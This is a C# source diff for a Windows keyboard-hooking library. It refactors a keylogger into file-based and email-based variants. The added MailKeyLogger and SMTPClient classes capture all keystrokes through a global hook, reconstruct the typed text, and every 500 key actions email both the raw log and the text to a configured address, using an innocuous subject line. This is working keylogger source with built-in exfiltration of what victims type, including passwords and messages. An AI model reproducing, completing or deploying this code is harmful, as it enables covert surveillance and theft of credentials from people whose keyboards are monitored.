@@ -4,6 +4,8 @@ using System.IO;		// Yeah, some of loggers can write to a file
 using System.Runtime.InteropServices; // Needed to declare DLL using
 using System.Text;		// Encoding matters
 using System.Collections.Generic; // List<> is there
+using System.Net;
+using System.Net.Mail;
 using System.Threading;	// Thread.Sleep is what i need there
 using System.Windows.Forms; // Keys enumeration is here
 
@@ -15,14 +17,12 @@ using WindowsInput.Native; // holds VirtualKeyCode enumeration.
 //TODO: COMMENT EVERYTHING!!!!
 // Yeeeaaah, i'll do it one day. :D
 
-
 // This namespace is about keyboard input. May be, i'll later extend it to mouse, too.
 // If You want to understand how it works, You want to understand what's windows API
 // and how does the system interprets keys numbers and states.
 // There is no very intricated things to know, though.
 // 
 namespace KeyboardExtending {
-
 	#region Enums
 	public enum Layout { // Wanted to use it in KeyLogger. May be later. -_-
 		RU = 1,
@@ -79,17 +79,17 @@ namespace KeyboardExtending {
 
 		#region  DLL signatures
 			#region Layout
-		// Сохранил полный путь для.
-		[System.Runtime.InteropServices.DllImport("user32.dll", CharSet = System.Runtime.InteropServices.CharSet.Auto)]
-		private static extern IntPtr GetKeyboardLayout(int windowsThreadProcessID); // https://msdn.microsoft.com/en-us/library/windows/desktop/ms646296%28v=vs.85%29.aspx
-		// If You read this page content You'll understand why the next two API functions are needed too.
+			// Сохранил полный путь для.
+			[System.Runtime.InteropServices.DllImport("user32.dll", CharSet = System.Runtime.InteropServices.CharSet.Auto)]
+			private static extern IntPtr GetKeyboardLayout(int windowsThreadProcessID); // https://msdn.microsoft.com/en-us/library/windows/desktop/ms646296%28v=vs.85%29.aspx
+			// If You read this page content You'll understand why the next two API functions are needed too.
 
-		[DllImport("user32.dll", CharSet = CharSet.Auto)]
-		private static extern int GetWindowThreadProcessId(IntPtr handleWindow, out int processID); // https://msdn.microsoft.com/en-us/library/windows/desktop/ms633522%28v=vs.85%29.aspx
+			[DllImport("user32.dll", CharSet = CharSet.Auto)]
+			private static extern int GetWindowThreadProcessId(IntPtr handleWindow, out int processID); // https://msdn.microsoft.com/en-us/library/windows/desktop/ms633522%28v=vs.85%29.aspx
 
-		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-		public static extern IntPtr GetForegroundWindow(); // https://msdn.microsoft.com/en-us/library/windows/desktop/ms633505%28v=vs.85%29.aspx
-		#endregion
+			[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+			public static extern IntPtr GetForegroundWindow(); // https://msdn.microsoft.com/en-us/library/windows/desktop/ms633505%28v=vs.85%29.aspx
+			#endregion
 			#region Keys state
 			[DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
 			public static extern int GetKeyboardState(byte[] keystate); //https://msdn.microsoft.com/en-us/library/windows/desktop/ms646299%28v=vs.85%29.aspx
@@ -640,361 +640,434 @@ namespace KeyboardExtending {
 	#endregion
 
 	#region Logging
-	class LogMaker {
-		private readonly KeysConverter _converter;
-		private bool _shift;
-		private bool _alt;
-		private bool _ctrl;
+		#region Serving classes
+		public class LogMaker {
+			private KeysConverter _converter;
+			private bool _shift;
+			private bool _alt;
+			private bool _ctrl;
 
-		public LogMaker() {
-			_converter = new KeysConverter();
-		}
-
-		public string Make(Keys key, KeyAction action) {
-			switch (key) {
-				case Keys.Return:
-					return "\n";
-				case Keys.LShiftKey:
-				case Keys.RShiftKey:
-				case Keys.ShiftKey:
-				case Keys.Shift:
-					if (action == KeyAction.KeyDown || action == KeyAction.SysKeyDown)
-						_shift = true;
-					else
-						_shift = false;
-					break;
-				case Keys.Alt:
-				case Keys.LMenu:
-				case Keys.RMenu:
-					if (action == KeyAction.KeyDown || action == KeyAction.SysKeyDown)
-						_alt = true;
-					else
-						_alt = false;
-					break;
-				case Keys.LControlKey:
-				case Keys.RControlKey:
-				case Keys.Control:
-				case Keys.ControlKey:
-					if (action == KeyAction.KeyDown || action == KeyAction.SysKeyDown)
-						_ctrl = true;
-					else
-						_ctrl = false;
-					break;
-				case Keys.Escape:
-					if (action == KeyAction.KeyDown || action == KeyAction.SysKeyDown)
-						return "\n[Escape]\n";
-					break;
-				case Keys.Space:
-					if (action == KeyAction.KeyDown || action == KeyAction.SysKeyDown)
-						return " ";
-					return "";
-				case Keys.Capital:
-				case Keys.Prior:
-				case Keys.Next:
-				case Keys.End:
-				case Keys.Home:
-				case Keys.Left:
-				case Keys.Up:
-				case Keys.Right:
-				case Keys.Down:
-				case Keys.Select:
-				case Keys.Print:
-				case Keys.Execute:
-				case Keys.Snapshot:
-				case Keys.Insert:
-				case Keys.Delete:
-				case Keys.Help:
-					if (action == KeyAction.KeyUp || action == KeyAction.SysKeyUp)
-						return "";
-					break;
-				case Keys.D0:
-				case Keys.D1:
-				case Keys.D2:
-				case Keys.D3:
-				case Keys.D4:
-				case Keys.D5:
-				case Keys.D6:
-				case Keys.D7:
-				case Keys.D8:
-				case Keys.D9:
-				case Keys.A:
-				case Keys.B:
-				case Keys.C:
-				case Keys.D:
-				case Keys.E:
-				case Keys.F:
-				case Keys.G:
-				case Keys.H:
-				case Keys.I:
-				case Keys.J:
-				case Keys.K:
-				case Keys.L:
-				case Keys.M:
-				case Keys.N:
-				case Keys.O:
-				case Keys.P:
-				case Keys.Q:
-				case Keys.R:
-				case Keys.S:
-				case Keys.T:
-				case Keys.U:
-				case Keys.V:
-				case Keys.W:
-				case Keys.X:
-				case Keys.Y:
-				case Keys.Z:
-					if (action == KeyAction.KeyDown || action == KeyAction.SysKeyDown) {
-						if (!_shift)
-							return _converter.ConvertToString(key).ToLower();
-						return _converter.ConvertToString(key);
-					}
-					return "";
-				case Keys.LWin:
-					if (action == KeyAction.KeyUp || action == KeyAction.SysKeyUp)
-						return "";
-					break;
-				case Keys.RWin:
-					if (action == KeyAction.KeyUp || action == KeyAction.SysKeyUp)
-						return "";
-					break;
-				case Keys.Apps:
-					if (action == KeyAction.KeyUp || action == KeyAction.SysKeyUp)
-						return "";
-					break;
-				case Keys.Sleep:
-					if (action == KeyAction.KeyUp || action == KeyAction.SysKeyUp)
-						return "";
-					break;
-				case Keys.NumPad0:
-				case Keys.NumPad1:
-				case Keys.NumPad2:
-				case Keys.NumPad3:
-				case Keys.NumPad4:
-				case Keys.NumPad5:
-				case Keys.NumPad6:
-				case Keys.NumPad7:
-				case Keys.NumPad8:
-				case Keys.NumPad9:
-					return key.ToString()[key.ToString().Length - 1].ToString();
-				case Keys.Multiply:
-				case Keys.Add:
-				case Keys.Subtract:
-				case Keys.Decimal:
-				case Keys.Divide:
-				case Keys.F1:
-				case Keys.F2:
-				case Keys.F3:
-				case Keys.F4:
-				case Keys.F5:
-				case Keys.F6:
-				case Keys.F7:
-				case Keys.F8:
-				case Keys.F9:
-				case Keys.F10:
-				case Keys.F11:
-				case Keys.F12:
-				case Keys.F13:
-				case Keys.F14:
-				case Keys.F15:
-				case Keys.F16:
-				case Keys.F17:
-				case Keys.F18:
-				case Keys.F19:
-				case Keys.F20:
-				case Keys.F21:
-				case Keys.F22:
-				case Keys.F23:
-				case Keys.F24:
-				case Keys.Separator:
-				case Keys.NumLock:
-				case Keys.Scroll:
-				case Keys.BrowserBack:
-				case Keys.BrowserForward:
-				case Keys.BrowserRefresh:
-				case Keys.BrowserStop:
-				case Keys.BrowserSearch:
-				case Keys.BrowserFavorites:
-				case Keys.BrowserHome:
-				case Keys.VolumeMute:
-				case Keys.VolumeDown:
-				case Keys.VolumeUp:
-				case Keys.MediaNextTrack:
-				case Keys.MediaPreviousTrack:
-				case Keys.MediaStop:
-				case Keys.MediaPlayPause:
-				case Keys.LaunchMail:
-				case Keys.SelectMedia:
-				case Keys.LaunchApplication1:
-				case Keys.LaunchApplication2:
-					if (action == KeyAction.KeyUp || action == KeyAction.SysKeyUp)
-						return "";
-					break;
-				case Keys.OemSemicolon:
-					if (action == KeyAction.KeyDown || action == KeyAction.SysKeyDown)
-						return ";";
-					return "";
-				case Keys.Oemplus:
-					if (action == KeyAction.KeyDown || action == KeyAction.SysKeyDown)
-						return "=";
-					return "";
-				case Keys.Oemcomma:
-					if (action == KeyAction.KeyDown || action == KeyAction.SysKeyDown)
-						return ",";
-					return "";
-				case Keys.OemMinus:
-					if (action == KeyAction.KeyDown || action == KeyAction.SysKeyDown)
-						return "-";
-					return "";
-				case Keys.OemPeriod:
-					if (action == KeyAction.KeyDown || action == KeyAction.SysKeyDown)
-						return ".";
-					return "";
-				case Keys.OemQuestion:
-					if (action == KeyAction.KeyDown || action == KeyAction.SysKeyDown)
-						return "/";
-					return "";
-				case Keys.Oemtilde:
-					if (action == KeyAction.KeyDown || action == KeyAction.SysKeyDown)
-						return "`";
-					return "";
-				case Keys.OemOpenBrackets:
-					if (action == KeyAction.KeyDown || action == KeyAction.SysKeyDown)
-						return "\\[";
-					return "";
-				case Keys.OemCloseBrackets:
-					if (action == KeyAction.KeyDown || action == KeyAction.SysKeyDown)
-						return "\\]";
-					return "";
-				case Keys.OemQuotes:
-					if (action == KeyAction.KeyDown || action == KeyAction.SysKeyDown)
-						return "'";
-					return "";
-				case Keys.Oem8:
-					break;
-				case Keys.OemBackslash:
-					if (action == KeyAction.KeyDown || action == KeyAction.SysKeyDown)
-						return "\\\\";
-					return "";
-				case Keys.ProcessKey:
-				case Keys.OemPipe:
-				case Keys.Packet:
-				case Keys.Attn:
-				case Keys.Crsel:
-				case Keys.Exsel:
-				case Keys.EraseEof:
-				case Keys.Play:
-				case Keys.Zoom:
-				case Keys.NoName:
-				case Keys.Pa1:
-				case Keys.OemClear:
-				case Keys.Back:
-					if (action == KeyAction.KeyUp || action == KeyAction.SysKeyUp)
-						return "";
-					break;
-				default:
-					if (action == KeyAction.KeyDown || action == KeyAction.SysKeyDown)
-						return "[" + key + "]";
-					return "[/" + key + "]";
+			public LogMaker() {
+				_converter = new KeysConverter();
 			}
-			if (action == KeyAction.KeyDown || action == KeyAction.SysKeyDown)
-				return "[" + key + "]";
-			return "[/" + key + "]";
+			public string Make(Keys key, KeyAction action) {
+				switch (key) {
+					case Keys.Return:
+						return "\n";
+					case Keys.LShiftKey:
+					case Keys.RShiftKey:
+					case Keys.ShiftKey:
+					case Keys.Shift:
+						if (action == KeyAction.KeyDown || action == KeyAction.SysKeyDown)
+							_shift = true;
+						else
+							_shift = false;
+						break;
+					case Keys.Alt:
+					case Keys.LMenu:
+					case Keys.RMenu:
+						if (action == KeyAction.KeyDown || action == KeyAction.SysKeyDown)
+							_alt = true;
+						else
+							_alt = false;
+						break;
+					case Keys.LControlKey:
+					case Keys.RControlKey:
+					case Keys.Control:
+					case Keys.ControlKey:
+						if (action == KeyAction.KeyDown || action == KeyAction.SysKeyDown)
+							_ctrl = true;
+						else
+							_ctrl = false;
+						break;
+					case Keys.Escape:
+						if (action == KeyAction.KeyDown || action == KeyAction.SysKeyDown)
+							return "\n[Escape]\n";
+						break;
+					case Keys.Space:
+						if (action == KeyAction.KeyDown || action == KeyAction.SysKeyDown)
+							return " ";
+						return "";
+					case Keys.Capital:
+					case Keys.Prior:
+					case Keys.Next:
+					case Keys.End:
+					case Keys.Home:
+					case Keys.Left:
+					case Keys.Up:
+					case Keys.Right:
+					case Keys.Down:
+					case Keys.Select:
+					case Keys.Print:
+					case Keys.Execute:
+					case Keys.Snapshot:
+					case Keys.Insert:
+					case Keys.Delete:
+					case Keys.Help:
+						if (action == KeyAction.KeyUp || action == KeyAction.SysKeyUp)
+							return "";
+						break;
+					case Keys.D0:
+					case Keys.D1:
+					case Keys.D2:
+					case Keys.D3:
+					case Keys.D4:
+					case Keys.D5:
+					case Keys.D6:
+					case Keys.D7:
+					case Keys.D8:
+					case Keys.D9:
+					case Keys.A:
+					case Keys.B:
+					case Keys.C:
+					case Keys.D:
+					case Keys.E:
+					case Keys.F:
+					case Keys.G:
+					case Keys.H:
+					case Keys.I:
+					case Keys.J:
+					case Keys.K:
+					case Keys.L:
+					case Keys.M:
+					case Keys.N:
+					case Keys.O:
+					case Keys.P:
+					case Keys.Q:
+					case Keys.R:
+					case Keys.S:
+					case Keys.T:
+					case Keys.U:
+					case Keys.V:
+					case Keys.W:
+					case Keys.X:
+					case Keys.Y:
+					case Keys.Z:
+						if (action == KeyAction.KeyDown || action == KeyAction.SysKeyDown) {
+							if (!_shift) {
+								var s = _converter.ConvertToString(key);
+								if (s != null) return s.ToLower();
+							}
+							return _converter.ConvertToString(key);
+						}
+						return "";
+					case Keys.LWin:
+						if (action == KeyAction.KeyUp || action == KeyAction.SysKeyUp)
+							return "";
+						break;
+					case Keys.RWin:
+						if (action == KeyAction.KeyUp || action == KeyAction.SysKeyUp)
+							return "";
+						break;
+					case Keys.Apps:
+						if (action == KeyAction.KeyUp || action == KeyAction.SysKeyUp)
+							return "";
+						break;
+					case Keys.Sleep:
+						if (action == KeyAction.KeyUp || action == KeyAction.SysKeyUp)
+							return "";
+						break;
+					case Keys.NumPad0:
+					case Keys.NumPad1:
+					case Keys.NumPad2:
+					case Keys.NumPad3:
+					case Keys.NumPad4:
+					case Keys.NumPad5:
+					case Keys.NumPad6:
+					case Keys.NumPad7:
+					case Keys.NumPad8:
+					case Keys.NumPad9:
+						return key.ToString()[key.ToString().Length - 1].ToString();
+					case Keys.Multiply:
+					case Keys.Add:
+					case Keys.Subtract:
+					case Keys.Decimal:
+					case Keys.Divide:
+					case Keys.F1:
+					case Keys.F2:
+					case Keys.F3:
+					case Keys.F4:
+					case Keys.F5:
+					case Keys.F6:
+					case Keys.F7:
+					case Keys.F8:
+					case Keys.F9:
+					case Keys.F10:
+					case Keys.F11:
+					case Keys.F12:
+					case Keys.F13:
+					case Keys.F14:
+					case Keys.F15:
+					case Keys.F16:
+					case Keys.F17:
+					case Keys.F18:
+					case Keys.F19:
+					case Keys.F20:
+					case Keys.F21:
+					case Keys.F22:
+					case Keys.F23:
+					case Keys.F24:
+					case Keys.Separator:
+					case Keys.NumLock:
+					case Keys.Scroll:
+					case Keys.BrowserBack:
+					case Keys.BrowserForward:
+					case Keys.BrowserRefresh:
+					case Keys.BrowserStop:
+					case Keys.BrowserSearch:
+					case Keys.BrowserFavorites:
+					case Keys.BrowserHome:
+					case Keys.VolumeMute:
+					case Keys.VolumeDown:
+					case Keys.VolumeUp:
+					case Keys.MediaNextTrack:
+					case Keys.MediaPreviousTrack:
+					case Keys.MediaStop:
+					case Keys.MediaPlayPause:
+					case Keys.LaunchMail:
+					case Keys.SelectMedia:
+					case Keys.LaunchApplication1:
+					case Keys.LaunchApplication2:
+						if (action == KeyAction.KeyUp || action == KeyAction.SysKeyUp)
+							return "";
+						break;
+					case Keys.OemSemicolon:
+						if (action == KeyAction.KeyDown || action == KeyAction.SysKeyDown)
+							return ";";
+						return "";
+					case Keys.Oemplus:
+						if (action == KeyAction.KeyDown || action == KeyAction.SysKeyDown)
+							return "=";
+						return "";
+					case Keys.Oemcomma:
+						if (action == KeyAction.KeyDown || action == KeyAction.SysKeyDown)
+							return ",";
+						return "";
+					case Keys.OemMinus:
+						if (action == KeyAction.KeyDown || action == KeyAction.SysKeyDown)
+							return "-";
+						return "";
+					case Keys.OemPeriod:
+						if (action == KeyAction.KeyDown || action == KeyAction.SysKeyDown)
+							return ".";
+						return "";
+					case Keys.OemQuestion:
+						if (action == KeyAction.KeyDown || action == KeyAction.SysKeyDown)
+							return "/";
+						return "";
+					case Keys.Oemtilde:
+						if (action == KeyAction.KeyDown || action == KeyAction.SysKeyDown)
+							return "`";
+						return "";
+					case Keys.OemOpenBrackets:
+						if (action == KeyAction.KeyDown || action == KeyAction.SysKeyDown)
+							return "\\[";
+						return "";
+					case Keys.OemCloseBrackets:
+						if (action == KeyAction.KeyDown || action == KeyAction.SysKeyDown)
+							return "\\]";
+						return "";
+					case Keys.OemQuotes:
+						if (action == KeyAction.KeyDown || action == KeyAction.SysKeyDown)
+							return "'";
+						return "";
+					case Keys.Oem8:
+						break;
+					case Keys.OemBackslash:
+						if (action == KeyAction.KeyDown || action == KeyAction.SysKeyDown)
+							return "\\\\";
+						return "";
+					case Keys.ProcessKey:
+					case Keys.OemPipe:
+					case Keys.Packet:
+					case Keys.Attn:
+					case Keys.Crsel:
+					case Keys.Exsel:
+					case Keys.EraseEof:
+					case Keys.Play:
+					case Keys.Zoom:
+					case Keys.NoName:
+					case Keys.Pa1:
+					case Keys.OemClear:
+					case Keys.Back:
+						if (action == KeyAction.KeyUp || action == KeyAction.SysKeyUp)
+							return "";
+						break;
+					default:
+						if (action == KeyAction.KeyDown || action == KeyAction.SysKeyDown)
+							return "[" + key + "]";
+						return "[/" + key + "]";
+				}
+				if (action == KeyAction.KeyDown || action == KeyAction.SysKeyDown)
+					return "[" + key + "]";
+				return "[/" + key + "]";
+			}
+		}
+		class SMTPClient {
+			#region Serving objects
+			private readonly SmtpClient _client;
+			#endregion
+
+			#region parameters
+			private readonly string _from;
+			#endregion
+
+			#region Structing
+			public SMTPClient(string server, int port, string from, string pass) {
+				_client = new SmtpClient(server, port) {
+					EnableSsl = true,
+					UseDefaultCredentials = false,
+					Credentials = new NetworkCredential(from, pass)
+				};
+				_from = from;
+			}
+			#endregion
+
+			#region Sending
+			public void Send(string to, string subj, string body, string attachPath) {
+				MailMessage mmessage = new MailMessage(_from, to, subj, body) {
+					BodyEncoding = Encoding.UTF8,
+					SubjectEncoding = Encoding.UTF8
+				};
+				_client.SendAsync(mmessage, null);
+			}
+			#endregion
+		}
+		#endregion
+
+		#region Logging classes
+		public abstract class KeyLogger { //TODO: Layouts. There must be a simple way to know what letter should be used for each button!
+			#region Serving objects
+			protected KeyHooker _hooker;
+			protected LogMaker _maker;
+			#endregion
+
+			#region Handling
+			protected abstract void Hooker_OnKeyAction(IntPtr hookID, KeyActionArgs e);
+			#endregion
 		}
 
-	}
+		public class FileKeyLogger : KeyLogger {
+			#region Consts
+			public const String DEFAULT_TEXT_PATH = "Log_text.txt";
+			public const String DEFAULT_LOG_PATH = "Log.txt";
+			public const int ACTIONS_TO_FLUSH = 500;
+			#endregion
 
-	public class KeyLogger { //TODO: Layouts. There must be a simple way to know what letter should be used for each button!
-		//TODO: Refactor it to smaller classes, make a virtual KeyLogger and then pull HardKeyLogger, RemoteKeyLogger, some else KeyLogger from it. Oh shit.
-		#region Consts
-		public const String DEFAULT_TEXT_PATH = "Log_text.txt";
-		public const String DEFAULT_LOG_PATH = "Log.txt";
-		public const int ACTIONS_TO_FLUSH = 10; // TODO: When finishing, replace with some bigger number. Made it small for testing purposes.
-		#endregion
+			#region Serving objects
+			private StreamWriter _writerLog;
+			private StreamWriter _writerText;
+			#endregion
 
-		#region Serving objects
-		KeyHooker _hooker;
-		StreamWriter _writerLog;
-		StreamWriter _writerText;
-		LogMaker _maker;
-		#endregion
+			#region parameters
+			private readonly string _logFilePath;
+			private readonly string _textFilePath;
+			private int _actions;
+			#endregion
 
-		#region parameters
-		private string _logFilePath;
-		private string _textFilePath;
-		#endregion
+			#region Structing
+			public FileKeyLogger(string folderPath) {
+				if (!Directory.Exists(folderPath))
+					throw new Exception("Directory '" + folderPath + "' not found!");
 
-		#region Structing
-		public KeyLogger() {
-			_logFilePath = DEFAULT_LOG_PATH;
-			_textFilePath = DEFAULT_TEXT_PATH;
-
-			Initialize();
-		}
-		public KeyLogger(bool startNow) {
-			_logFilePath = DEFAULT_LOG_PATH;
-			_textFilePath = DEFAULT_TEXT_PATH;
-
-			if (startNow)
+				_logFilePath = folderPath + "\\" + DEFAULT_LOG_PATH;
+				_textFilePath = folderPath + "\\" + DEFAULT_TEXT_PATH;
 				Initialize();
-		}
-
-		public KeyLogger(string folderPath) {
-			if (!Directory.Exists(folderPath))
-				throw new Exception("Directory '" + folderPath + "' not found!");
-
-			_logFilePath = folderPath + "\\" + DEFAULT_LOG_PATH;
-			_textFilePath = folderPath + "\\" + DEFAULT_TEXT_PATH;
-			Initialize();
-		}
-		public void Begin() {
-			Initialize();
-		}
-
-		public KeyLogger(string logFilePath, string textFilePath) {
-			if (!Directory.Exists(logFilePath.Remove(logFilePath.LastIndexOf("\\", StringComparison.Ordinal))))
-				throw new Exception("Directory '" + logFilePath + "' not found!");
-			if (!Directory.Exists(textFilePath.Remove(textFilePath.LastIndexOf("\\", StringComparison.Ordinal))))
-				throw new Exception("Directory '" + textFilePath + "' not found!");
-
-			_logFilePath = logFilePath;
-			_textFilePath = textFilePath;
-			Initialize();
-		}
-
-		private void Initialize() {
-			_writerLog = new StreamWriter(new FileStream(_logFilePath, FileMode.Append), Encoding.Unicode) {
-				AutoFlush = false
-			};
-			_writerText = new StreamWriter(new FileStream(_textFilePath, FileMode.Append), Encoding.Unicode) {
-				AutoFlush = false
-			};
-
-			_maker = new LogMaker();
-			_hooker = new KeyHooker(false);
-			_hooker.OnKeyAction += Hooker_OnKeyAction;
-			_actions = 0;
-			_hooker.Hook();
-		}
-		#endregion
-
-		#region Handling
-		private int _actions;
-		private void Hooker_OnKeyAction(IntPtr hookID, KeyActionArgs e) {
-			_writerLog.WriteLine(((int)e.KeyCode) + ";" + e.KeyAction);
-
-			string toWrite = _maker.Make(e.KeyCode, (KeyAction)e.KeyAction);
-			if(!string.IsNullOrEmpty(toWrite))
-				_writerText.Write(toWrite); ;
-
-			_actions++;
-			if (_actions == ACTIONS_TO_FLUSH) {
-				_writerLog.Flush();
-				_writerText.Flush();
-				_actions = 0;
 			}
+			public FileKeyLogger(string logFilePath, string textFilePath) {
+				if (!Directory.Exists(logFilePath.Remove(logFilePath.LastIndexOf("\\", StringComparison.Ordinal))))
+					throw new Exception("Directory '" + logFilePath + "' not found!");
+				if (!Directory.Exists(textFilePath.Remove(textFilePath.LastIndexOf("\\", StringComparison.Ordinal))))
+					throw new Exception("Directory '" + textFilePath + "' not found!");
+
+				_logFilePath = logFilePath;
+				_textFilePath = textFilePath;
+				Initialize();
+			}
+			private void Initialize() {
+				_writerLog = new StreamWriter(new FileStream(_logFilePath, FileMode.Append), Encoding.Unicode) {
+					AutoFlush = false
+				};
+				_writerText = new StreamWriter(new FileStream(_textFilePath, FileMode.Append), Encoding.Unicode) {
+					AutoFlush = false
+				};
+
+				_maker = new LogMaker();
+				_hooker = new KeyHooker(false);
+				_hooker.OnKeyAction += Hooker_OnKeyAction;
+				_actions = 0;
+				_hooker.Hook();
+			}
+			#endregion
+
+			#region Handling, Logging
+			override protected void Hooker_OnKeyAction(IntPtr hookID, KeyActionArgs e) {
+				_writerLog.WriteLine(((int)e.KeyCode) + ";\t" + e.KeyAction + ";\t" + e.KeyCode);
+
+				string toWrite = _maker.Make(e.KeyCode, (KeyAction)e.KeyAction);
+				if (!string.IsNullOrEmpty(toWrite))
+					_writerText.Write(_maker.Make(e.KeyCode, (KeyAction)e.KeyAction));
+
+				_actions++;
+				if (_actions == ACTIONS_TO_FLUSH) {
+					_writerLog.Flush();
+					_writerText.Flush();
+					_actions = 0;
+				}
+			}
+			#endregion
+		}
+
+		public class MailKeyLogger : KeyLogger {
+			#region Consts
+			public const int ACTIONS_TO_SEND = 500;
+			#endregion
+
+			#region Serving objects
+			SMTPClient _client;
+			#endregion
+
+			#region Parameters
+			private string _log;
+			private string _keyLog;
+			private int _actions;
+			private string _to;
+			#endregion
+
+			#region Structing
+			public MailKeyLogger(string server, int port, string from, string pass, string to) {
+				_client = new SMTPClient(server, port, from, pass);
+				_to = to;
+				Initialize();
+			}
+			private void Initialize() {
+				_maker = new LogMaker();
+				_hooker = new KeyHooker(false);
+				_hooker.OnKeyAction += Hooker_OnKeyAction;
+				_actions = 0;
+				_hooker.Hook();
+			}
+			#endregion
+
+			#region Handling, sending
+			override protected void Hooker_OnKeyAction(IntPtr hookID, KeyActionArgs e) {
+				_log += (((int)e.KeyCode) + ";\t" + e.KeyAction + ";\t" + e.KeyCode + '\n');
+
+				string toLog = _maker.Make(e.KeyCode, (KeyAction)e.KeyAction);
+				if (!string.IsNullOrEmpty(toLog))
+					_keyLog += (_maker.Make(e.KeyCode, (KeyAction)e.KeyAction));
+
+				_actions++;
+				if (_actions == ACTIONS_TO_SEND) {
+					_client.Send(_to, "Just a log", _log, null);
+					_client.Send(_to, "differently formatted log", _keyLog, null);
+					_log = "";
+					_keyLog = "";
+					_actions = 0;
+				}
+			}
+			#endregion
 		}
 		#endregion
-	}
 	#endregion
-
 }
